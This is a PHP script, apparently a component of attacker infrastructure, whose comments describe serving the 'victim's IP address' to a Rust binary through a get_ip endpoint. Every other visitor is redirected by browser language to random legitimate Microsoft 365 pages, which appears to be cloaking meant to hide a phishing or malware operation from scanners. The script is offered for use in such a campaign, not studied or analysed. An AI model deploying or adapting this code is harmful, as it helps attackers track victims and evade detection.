<?php
// ==========================================================================
// PHANTOM IP PROVIDER + LANGUAGE REDIRECTOR v4.0 🔥
// ==========================================================================
// ✅ Job 1: Serve victim's IP address to Rust binary
// ✅ Job 2: Redirect users based on browser language (ar/en/de)
// ==========================================================================

// ==================== JOB 1: IP ADDRESS PROVIDER ====================
if (isset($_GET['action']) && $_GET['action'] === 'get_ip') {
    // Detect real IP (handles Cloudflare, proxies, direct connections)
    $ip = 'unknown';
    
    // Priority 1: Cloudflare connecting IP
    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
        $ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
    }
    // Priority 2: X-Forwarded-For (Proxy/Load Balancer)
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        // Take first IP from comma-separated list
        $forwarded = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        $ip = trim($forwarded[0]);
    }
    // Priority 3: Direct connection
    elseif (!empty($_SERVER['REMOTE_ADDR'])) {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    
    // Return plain text IP
    header('Content-Type: text/plain');
    echo $ip;
    exit;
}

// ==================== JOB 2: LANGUAGE-BASED REDIRECT ====================

// Redirect URL pools per language
$redirects = [
    'ar' => [ // Arabic
        'https://www.microsoft.com/ar-ae/microsoft-365',
        'https://www.microsoft.com/ar-sa/microsoft-365',
        'https://support.microsoft.com/ar-ae'
    ],
    'de' => [ // German
        'https://www.microsoft.com/de-de/microsoft-365',
        'https://www.microsoft.com/de-at/microsoft-365',
        'https://support.microsoft.com/de-de'
    ],
    'en' => [ // English (default)
        'https://www.microsoft.com/en-us/microsoft-365',
        'https://www.office.com',
        'https://account.microsoft.com'
    ]
];

// Detect browser language
$browserLang = strtolower(substr($_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'en', 0, 2));

// Map to supported language (default to English)
$lang = 'en';
if ($browserLang === 'ar') {
    $lang = 'ar';
} elseif ($browserLang === 'de') {
    $lang = 'de';
}

// Pick random URL from pool
$urlPool = $redirects[$lang];
$redirectUrl = $urlPool[array_rand($urlPool)];

// Redirect immediately
header("Location: $redirectUrl", true, 302);
exit;
?>
